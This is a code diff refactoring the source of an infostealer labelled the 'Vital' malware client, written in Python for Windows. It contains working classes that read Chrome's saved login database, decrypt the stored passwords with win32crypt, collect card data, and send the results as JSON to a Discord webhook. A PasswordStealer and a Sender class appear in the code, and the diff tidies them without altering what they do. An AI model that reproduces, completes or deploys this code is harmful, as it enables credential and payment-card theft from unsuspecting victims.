@@ -1,17 +1,36 @@
-import ctypes, os, subprocess, time, re, requests, sys, sqlite3, win32crypt, shutil, json, random, string
+# 'Vital' malware client
+# Current line count:
+
+# Originally created by github.com/rpie
+
+import ctypes
+import os
+import subprocess
+import time
+import re
+import requests
+import sys
+import sqlite3
+import win32crypt
+import shutil
+import json
+import random
+import string
+import PyChromeDevTools
+
 from colorama import Fore
-try: import PyChromeDevTools
-except ImportError: os.system('pip3 install PyChromeDevTools'); os.system('py -m pip install PyChromeDevTools'); import PyChromeDevTools
 
-webhook = '' # Discord webhook or smth
-website = '' # Website to redirect to when finished 
 
-###############################
-# Look at index.php in /server
-credRec = ''
-###############################
+""" Global variables """
 
-debug = False
+webhook 	= 	'' 									# Discord webhook URL
+website 	= 	'' 									# Optional redirect to website
+credRec 	= 	'' 									# "Look at index.php in /server" --- HellSec please provide some clarification here?
+CHROME_DATA 	=	'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'	# Chrome login data path
+
+debug 		= 	False									# Enable or disable debugging
+
+""" Classes """
 
 class Sender:
 	def __init__(self, url):
@@ -23,7 +42,7 @@ class Sender:
 		jsondata = json.dumps(data)
 		reqbytes = jsondata.encode("utf-8")
 
-		req.add_header("Content-Type","application/json; charser=utf-8")
+		req.add_header("Content-Type","application/json; charset=utf-8")
 		req.add_header("Content-Length",len(reqbytes))
 		req.add_header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36")
 		urllib.request.urlopen(req, reqbytes)
@@ -83,10 +102,14 @@ class CardStealer:
 
 class PasswordStealer:
 	def __init__(self):
-		self.connection = SQLite3LockedConnection(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
+		self.connection = SQLite3LockedConnection(
+			os.getenv("USERPROFILE") + CHROME_DATA
+		)
+		self.stolen = []
+		
 	def steal(self):
 		data = self.connection.run("SELECT action_url, username_value, password_value FROM logins")
-		stolen = []
+		
 		if len(data) > 0:
 			for result in data:
 				url = result[0]
@@ -96,15 +119,17 @@ class PasswordStealer:
 				except:
 					pass
 				if password:
-					stolen.append({
+					self.stolen.append({
 						"url": url,
 						"username": username,
 						"password": password[1].decode()
 					})
-		else:
-			return None
-		self.connection.close()
-		return stolen
+	
+			return self.stolen
+		
+		return None
+
+""" Functions """
 
 def getLocations():
     username = os.environ.get('username')
